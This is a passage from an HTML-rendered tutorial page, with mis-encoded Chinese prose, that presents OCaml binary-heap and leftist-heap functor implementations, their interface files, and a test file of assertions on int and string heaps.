      <span class="n">shiftDown</span> <span class="n">0</span>

  <span class="k">let</span> <span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="k">then</span> <span class="n">failwith</span> <span class="s2">&#34;empty&#34;</span> <span class="k">else</span> <span class="n">t</span><span class="o">.</span><span class="n">elements</span><span class="o">.(</span><span class="n">0</span><span class="o">)</span>

  <span class="k">let</span> <span class="k">rec</span> <span class="n">toList</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="k">then</span> <span class="bp">[]</span>
    <span class="k">else</span>
      <span class="k">let</span> <span class="n">top</span> <span class="o">=</span> <span class="n">getTop</span> <span class="n">t</span> <span class="k">in</span>
      <span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
      <span class="n">top</span> <span class="o">::</span> <span class="n">toList</span> <span class="n">t</span>

  <span class="k">let</span> <span class="k">rec</span> <span class="n">fromList</span> <span class="n">n</span> <span class="n">default</span> <span class="o">=</span> <span class="k">function</span>
    <span class="o">|</span> <span class="bp">[]</span> <span class="o">-&gt;</span> <span class="n">create</span> <span class="n">n</span> <span class="n">default</span>
    <span class="o">|</span> <span class="n">hd</span> <span class="o">::</span> <span class="n">tl</span> <span class="o">-&gt;</span>
        <span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="n">fromList</span> <span class="n">n</span> <span class="n">default</span> <span class="n">tl</span> <span class="k">in</span>
        <span class="n">insert</span> <span class="n">hd</span> <span class="n">t</span><span class="o">;</span>
        <span class="n">t</span>
<span class="k">end</span>
</code></pre></div><p><code>binary_heap.mli</code></p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* Input signature of the functor *)</span>
<span class="k">module</span> <span class="k">type</span> <span class="nc">OrderedType</span> <span class="o">=</span> <span class="k">sig</span>
  <span class="c">(* the type of the heap elements *)</span>
  <span class="k">type</span> <span class="n">t</span>

  <span class="c">(* compare function used to determine the order of elements *)</span>
  <span class="k">val</span> <span class="n">compare</span> <span class="o">:</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="kt">int</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nc">Make</span> <span class="o">:</span> <span class="k">functor</span> <span class="o">(</span><span class="nc">Ord</span> <span class="o">:</span> <span class="nc">OrderedType</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="k">sig</span>
  <span class="k">type</span> <span class="n">elt</span> <span class="o">=</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">t</span>

  <span class="k">type</span> <span class="n">tree</span>

  <span class="c">(* create an empty heap, with only a leaf *)</span>
  <span class="k">val</span> <span class="n">create</span> <span class="o">:</span> <span class="kt">int</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* insert an element into a heap, just like merge two heap *)</span>
  <span class="k">val</span> <span class="n">insert</span> <span class="o">:</span> <span class="n">elt</span> <span class="o">-&gt;</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="kt">unit</span>

  <span class="c">(* delete the top element of a heap, just merge two children trees *)</span>
  <span class="k">val</span> <span class="n">deleteTop</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="kt">unit</span>

  <span class="c">(* get the top element of a heap *)</span>
  <span class="k">val</span> <span class="n">getTop</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">elt</span>

  <span class="c">(* generate a list from a heap *)</span>
  <span class="k">val</span> <span class="n">toList</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="kt">list</span>

  <span class="c">(* create a heap from list *)</span>
  <span class="k">val</span> <span class="n">fromList</span> <span class="o">:</span> <span class="kt">int</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="kt">list</span> <span class="o">-&gt;</span> <span class="n">tree</span>
<span class="k">end</span>
</code></pre></div><h2 id="å·¦åå †">å·¦åå †</h2>
<p>è¿™é‡Œçš„å·¦åå †é‡‡ç”¨äº†çº¯å‡½æ•°å¼çš„å†™æ³•ï¼ŒåŒ…æ‹¬é‡‡ç”¨è”åˆä½“æ„å»ºä¸€æ£µäºŒå‰æ ‘ï¼Œæ‰€æœ‰æ“ä½œéƒ½æ— å‰¯ä½œç”¨ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡ç­‰ã€‚å’Œä¸Šé¢å‘½ä»¤å¼çš„å†™æ³•ç›¸æ¯”ï¼Œä¹Ÿæ›´åŠ ç®€ç»ƒï¼Œé€šè¿‡é€’å½’å’Œè¿­ä»£å°±å®ç°äº†å¤æ‚çš„æ“ä½œé€»è¾‘</p>
<p><code>heap.ml</code></p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* Input signature of the functor *)</span>
<span class="k">module</span> <span class="k">type</span> <span class="nc">OrderedType</span> <span class="o">=</span> <span class="k">sig</span>
  <span class="c">(* the type of the heap elements *)</span>
  <span class="k">type</span> <span class="n">t</span>

  <span class="c">(* compare function used to determine the order of elements *)</span>
  <span class="k">val</span> <span class="n">compare</span> <span class="o">:</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="kt">int</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nc">Make</span> <span class="o">(</span><span class="nc">Ord</span> <span class="o">:</span> <span class="nc">OrderedType</span><span class="o">)</span> <span class="o">=</span> <span class="k">struct</span>
  <span class="k">type</span> <span class="n">elt</span> <span class="o">=</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">t</span>

  <span class="c">(* heaps are represented by leftist tree *)</span>
  <span class="k">type</span> <span class="n">tree</span> <span class="o">=</span>
    <span class="c">(* leaf node *)</span>
    <span class="o">|</span> <span class="nc">Leaf</span>
    <span class="c">(* left child, value of node, right child, rank of node *)</span>
    <span class="o">|</span> <span class="nc">Node</span> <span class="k">of</span> <span class="n">tree</span> <span class="o">*</span> <span class="n">elt</span> <span class="o">*</span> <span class="n">tree</span> <span class="o">*</span> <span class="kt">int</span>

  <span class="c">(* create an empty heap, with only a leaf *)</span>
  <span class="k">let</span> <span class="n">create</span> <span class="bp">()</span> <span class="o">=</span> <span class="nc">Leaf</span>

  <span class="c">(* create a node contains only v *)</span>
  <span class="k">let</span> <span class="n">singleton</span> <span class="n">v</span> <span class="o">=</span> <span class="nc">Node</span> <span class="o">(</span><span class="nc">Leaf</span><span class="o">,</span> <span class="n">v</span><span class="o">,</span> <span class="nc">Leaf</span><span class="o">,</span> <span class="n">1</span><span class="o">)</span>

  <span class="c">(* get the rank of a node *)</span>
  <span class="k">let</span> <span class="n">getRank</span> <span class="o">=</span> <span class="k">function</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">0</span> <span class="o">|</span> <span class="nc">Node</span> <span class="o">(_,</span> <span class="o">_,</span> <span class="o">_,</span> <span class="n">r</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="n">r</span>

  <span class="c">(* merge to heap, the most important function in leftist heap *)</span>
  <span class="k">let</span> <span class="k">rec</span> <span class="n">merge</span> <span class="n">t1</span> <span class="n">t2</span> <span class="o">=</span>
    <span class="k">match</span> <span class="o">(</span><span class="n">t1</span><span class="o">,</span> <span class="n">t2</span><span class="o">)</span> <span class="k">with</span>
    <span class="o">|</span> <span class="nc">Leaf</span><span class="o">,</span> <span class="n">t</span> <span class="o">|</span> <span class="n">t</span><span class="o">,</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">t</span>
    <span class="o">|</span> <span class="nc">Node</span> <span class="o">(</span><span class="n">l</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="n">r</span><span class="o">,</span> <span class="o">_),</span> <span class="nc">Node</span> <span class="o">(_,</span> <span class="n">v2</span><span class="o">,</span> <span class="o">_,</span> <span class="o">_)</span> <span class="o">-&gt;</span>
        <span class="c">(* switch two heap if the tree on the left have a bigger key *)</span>
        <span class="k">if</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">compare</span> <span class="n">v1</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="k">then</span> <span class="n">merge</span> <span class="n">t2</span> <span class="n">t1</span>
          <span class="c">(* the order is determined by the compare function *)</span>
        <span class="k">else</span>
          <span class="c">(* merge with the right tree *)</span>
          <span class="k">let</span> <span class="n">merged</span> <span class="o">=</span> <span class="n">merge</span> <span class="n">r</span> <span class="n">t2</span> <span class="k">in</span>
          <span class="k">let</span> <span class="n">leftRank</span> <span class="o">=</span> <span class="n">getRank</span> <span class="n">l</span> <span class="ow">and</span> <span class="n">rightRank</span> <span class="o">=</span> <span class="n">getRank</span> <span class="n">merged</span> <span class="k">in</span>
          <span class="c">(* compare the rank of both tree *)</span>
          <span class="k">if</span> <span class="n">leftRank</span> <span class="o">&gt;=</span> <span class="n">rightRank</span> <span class="k">then</span> <span class="nc">Node</span> <span class="o">(</span><span class="n">l</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="n">merged</span><span class="o">,</span> <span class="n">rightRank</span> <span class="o">+</span> <span class="n">1</span><span class="o">)</span>
            <span class="c">(* switch left and right since left tree is shorter *)</span>
          <span class="k">else</span> <span class="nc">Node</span> <span class="o">(</span><span class="n">merged</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="n">l</span><span class="o">,</span> <span class="n">leftRank</span> <span class="o">+</span> <span class="n">1</span><span class="o">)</span>

  <span class="c">(* insert an element into a heap, just like merge two heap *)</span>
  <span class="k">let</span> <span class="n">insert</span> <span class="n">v</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">match</span> <span class="n">t</span> <span class="k">with</span>
    <span class="o">|</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">singleton</span> <span class="n">v</span>
    <span class="o">|</span> <span class="nc">Node</span> <span class="o">(_,</span> <span class="o">_,</span> <span class="o">_,</span> <span class="o">_)</span> <span class="o">-&gt;</span> <span class="n">merge</span> <span class="n">t</span> <span class="o">(</span><span class="n">singleton</span> <span class="n">v</span><span class="o">)</span>

  <span class="c">(* get the top element of a heap *)</span>
  <span class="k">let</span> <span class="n">getTop</span> <span class="o">=</span> <span class="k">function</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">failwith</span> <span class="s2">&#34;empty&#34;</span> <span class="o">|</span> <span class="nc">Node</span> <span class="o">(_,</span> <span class="n">v</span><span class="o">,</span> <span class="o">_,</span> <span class="o">_)</span> <span class="o">-&gt;</span> <span class="n">v</span>

  <span class="c">(* delete the top element of a heap, just merge two children trees *)</span>
  <span class="k">let</span> <span class="n">deleteTop</span> <span class="o">=</span> <span class="k">function</span>
    <span class="o">|</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">failwith</span> <span class="s2">&#34;empty&#34;</span>
    <span class="o">|</span> <span class="nc">Node</span> <span class="o">(</span><span class="n">l</span><span class="o">,</span> <span class="o">_,</span> <span class="n">r</span><span class="o">,</span> <span class="o">_)</span> <span class="o">-&gt;</span> <span class="n">merge</span> <span class="n">l</span> <span class="n">r</span>

  <span class="c">(* generate a list from a heap *)</span>
  <span class="k">let</span> <span class="k">rec</span> <span class="n">toList</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">match</span> <span class="n">t</span> <span class="k">with</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="bp">[]</span> <span class="o">|</span> <span class="o">_</span> <span class="o">-&gt;</span> <span class="n">getTop</span> <span class="n">t</span> <span class="o">::</span> <span class="n">toList</span> <span class="o">(</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">)</span>

  <span class="k">let</span> <span class="k">rec</span> <span class="n">fromList</span> <span class="o">=</span> <span class="k">function</span>
    <span class="o">|</span> <span class="bp">[]</span> <span class="o">-&gt;</span> <span class="n">create</span> <span class="bp">()</span>
    <span class="o">|</span> <span class="n">hd</span> <span class="o">::</span> <span class="n">tl</span> <span class="o">-&gt;</span> <span class="n">insert</span> <span class="n">hd</span> <span class="o">(</span><span class="n">fromList</span> <span class="n">tl</span><span class="o">)</span>
<span class="k">end</span>
</code></pre></div><p><code>heap.mli</code></p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* Input signature of the functor *)</span>
<span class="k">module</span> <span class="k">type</span> <span class="nc">OrderedType</span> <span class="o">=</span> <span class="k">sig</span>
  <span class="c">(* the type of the heap elements *)</span>
  <span class="k">type</span> <span class="n">t</span>

  <span class="c">(* compare function used to determine the order of elements *)</span>
  <span class="k">val</span> <span class="n">compare</span> <span class="o">:</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="kt">int</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nc">Make</span> <span class="o">:</span> <span class="k">functor</span> <span class="o">(</span><span class="nc">Ord</span> <span class="o">:</span> <span class="nc">OrderedType</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="k">sig</span>
  <span class="k">type</span> <span class="n">elt</span> <span class="o">=</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">t</span>

  <span class="k">type</span> <span class="n">tree</span>

  <span class="c">(* create an empty heap, with only a leaf *)</span>
  <span class="k">val</span> <span class="n">create</span> <span class="o">:</span> <span class="kt">unit</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* merge to heap, the most important function in leftist heap *)</span>
  <span class="k">val</span> <span class="n">merge</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* insert an element into a heap, just like merge two heap *)</span>
  <span class="k">val</span> <span class="n">insert</span> <span class="o">:</span> <span class="n">elt</span> <span class="o">-&gt;</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* get the top element of a heap *)</span>
  <span class="k">val</span> <span class="n">getTop</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">elt</span>

  <span class="c">(* delete the top element of a heap, just merge two children trees *)</span>
  <span class="k">val</span> <span class="n">deleteTop</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* generate a list from a heap *)</span>
  <span class="k">val</span> <span class="n">toList</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="kt">list</span>

  <span class="c">(* create a heap from list *)</span>
  <span class="k">val</span> <span class="n">fromList</span> <span class="o">:</span> <span class="n">elt</span> <span class="kt">list</span> <span class="o">-&gt;</span> <span class="n">tree</span>
<span class="k">end</span>
</code></pre></div><p><code>test.ml</code></p>
<p>æµ‹è¯•æ–‡ä»¶ï¼Œå¯¹æ‰€å†™çš„å †å‘å¤–æä¾›çš„å‡½æ•°è¿›è¡Œæµ‹è¯•ã€‚åˆ›å»ºäº†ä¸€ä¸ªå¸¦ <code>int</code> ç±»å‹çš„å‡½å­ï¼Œé‡‡ç”¨è‡ªå®šä¹‰çš„æ’åºå‡½æ•°å®ç°å¤§é¡¶å †ã€‚è¿˜åˆ›å»ºäº†ä¸€ä¸ª <code>String</code> ç±»å‹çš„å‡½å­</p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* int å‹å‡½å­ï¼Œå¸¦æ¯”è¾ƒå‡½æ•° *)</span>
<span class="k">module</span> <span class="nc">E</span> <span class="o">=</span> <span class="k">struct</span>
  <span class="k">type</span> <span class="n">t</span> <span class="o">=</span> <span class="kt">int</span>

  <span class="k">let</span> <span class="n">compare</span> <span class="n">a</span> <span class="n">b</span> <span class="o">=</span> <span class="o">-</span><span class="n">compare</span> <span class="n">a</span> <span class="n">b</span>
<span class="k">end</span>

<span class="c">(* int å‹å¤§é¡¶å †ï¼Œé‡‡ç”¨å·¦åæ ‘ *)</span>
<span class="k">module</span> <span class="nc">H_int</span> <span class="o">=</span> <span class="nn">Heap</span><span class="p">.</span><span class="nc">Make</span> <span class="o">(</span><span class="nc">E</span><span class="o">)</span>

<span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">create</span> <span class="bp">()</span>

<span class="c">(* æµ‹è¯•åŸºæœ¬çš„æ’å…¥ã€åˆ é™¤ç­‰æ“ä½œ *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t</span> <span class="o">=</span>
    <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">3</span> <span class="n">t</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">5</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">1</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">4</span>
    <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">2</span>
  <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">5</span><span class="o">);</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="o">|&gt;</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="o">=</span> <span class="n">3</span><span class="o">);</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%d &#34;</span><span class="o">)</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t</span><span class="o">);</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* æµ‹è¯•ä» list æ„å»ºå’Œç”Ÿæˆ list *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">l</span> <span class="o">=</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">toList</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="n">4</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">1</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">0</span> <span class="o">])</span> <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="n">l</span> <span class="o">=</span> <span class="o">[</span> <span class="n">7</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">1</span><span class="o">;</span> <span class="n">0</span> <span class="o">]);</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%d &#34;</span><span class="o">)</span> <span class="n">l</span><span class="o">;</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* æµ‹è¯•åˆå¹¶ä¸¤ä¸ªå † *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t</span> <span class="o">=</span>
    <span class="nn">H_int</span><span class="p">.</span><span class="n">merge</span>
      <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="n">1</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">9</span> <span class="o">])</span>
      <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="n">2</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">8</span> <span class="o">])</span>
  <span class="k">in</span>
  <span class="k">let</span> <span class="n">l</span> <span class="o">=</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t</span> <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="n">l</span> <span class="o">=</span> <span class="o">[</span> <span class="n">9</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">1</span> <span class="o">]);</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%d &#34;</span><span class="o">)</span> <span class="n">l</span><span class="o">;</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* string å‹å°é¡¶å † *)</span>
<span class="k">module</span> <span class="nc">H_string</span> <span class="o">=</span> <span class="nn">Heap</span><span class="p">.</span><span class="nc">Make</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span>

<span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">create</span> <span class="bp">()</span>

<span class="c">(* æµ‹è¯•åŸºæœ¬çš„æ’å…¥ã€åˆ é™¤ç­‰æ“ä½œ *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t</span> <span class="o">=</span>
    <span class="nn">H_string</span><span class="p">.</span><span class="n">insert</span> <span class="s2">&#34;asdf&#34;</span> <span class="n">t</span> <span class="o">|&gt;</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">insert</span> <span class="s2">&#34;qwer&#34;</span> <span class="o">|&gt;</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">insert</span> <span class="s2">&#34;zz&#34;</span>
  <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="s2">&#34;asdf&#34;</span><span class="o">);</span>
  <span class="k">assert</span> <span class="o">(</span>
    <span class="nn">H_string</span><span class="p">.</span><span class="n">toList</span>
      <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span> <span class="o">|&gt;</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">deleteTop</span> <span class="o">|&gt;</span> <span class="nn">H_string</span><span class="p">.</span><span class="n">insert</span> <span class="s2">&#34;bb&#34;</span><span class="o">)</span>
    <span class="o">=</span> <span class="o">[</span> <span class="s2">&#34;bb&#34;</span><span class="o">;</span> <span class="s2">&#34;zz&#34;</span> <span class="o">]</span> <span class="o">)</span>

<span class="c">(* æµ‹è¯• string ç±»å‹ä¸Šçš„æ“ä½œ *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">l</span> <span class="o">=</span>
    <span class="nn">H_string</span><span class="p">.</span><span class="n">toList</span>
      <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">merge</span>
         <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="s2">&#34;Z&#34;</span><span class="o">;</span> <span class="s2">&#34;Y&#34;</span><span class="o">;</span> <span class="s2">&#34;X&#34;</span> <span class="o">])</span>
         <span class="o">(</span><span class="nn">H_string</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="s2">&#34;y&#34;</span><span class="o">;</span> <span class="s2">&#34;z&#34;</span><span class="o">;</span> <span class="s2">&#34;x&#34;</span> <span class="o">]))</span>
  <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="n">l</span> <span class="o">=</span> <span class="o">[</span> <span class="s2">&#34;X&#34;</span><span class="o">;</span> <span class="s2">&#34;Y&#34;</span><span class="o">;</span> <span class="s2">&#34;Z&#34;</span><span class="o">;</span> <span class="s2">&#34;x&#34;</span><span class="o">;</span> <span class="s2">&#34;y&#34;</span><span class="o">;</span> <span class="s2">&#34;z&#34;</span> <span class="o">]);</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%s &#34;</span><span class="o">)</span> <span class="n">l</span><span class="o">;</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* int å‹å¤§é¡¶å †ï¼Œé‡‡ç”¨æ•°ç»„æ¨¡æ‹Ÿå®Œå…¨äºŒå‰æ ‘ *)</span>
<span class="k">module</span> <span class="nc">B_H_int</span> <span class="o">=</span> <span class="nn">Binary_heap</span><span class="p">.</span><span class="nc">Make</span> <span class="o">(</span><span class="nc">E</span><span class="o">)</span>

<span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">create</span> <span class="n">20</span> <span class="n">0</span>

<span class="c">(* æµ‹è¯•åŸºæœ¬çš„æ’å…¥ã€åˆ é™¤ç­‰æ“ä½œ *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">1</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">3</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">2</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">4</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">4</span><span class="o">);</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">3</span><span class="o">);</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">2</span><span class="o">);</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">6</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">6</span><span class="o">);</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="n">1</span><span class="o">)</span>

<span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">create</span> <span class="n">20</span> <span class="n">0</span>

<span class="c">(* æµ‹è¯•ç”Ÿæˆ list *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">1</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">3</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">2</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">B_H_int</span><span class="p">.</span><span class="n">insert</span> <span class="n">4</span> <span class="n">t</span><span class="o">;</span>
  <span class="nn">List</span><span class="p">.</span><span class="n">iter</span> <span class="o">(</span><span class="nn">Printf</span><span class="p">.</span><span class="n">printf</span> <span class="s2">&#34;%d &#34;</span><span class="o">)</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t</span><span class="o">);</span>
  <span class="n">print_newline</span> <span class="bp">()</span>

<span class="c">(* æµ‹è¯•ä» list æ„å»º *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
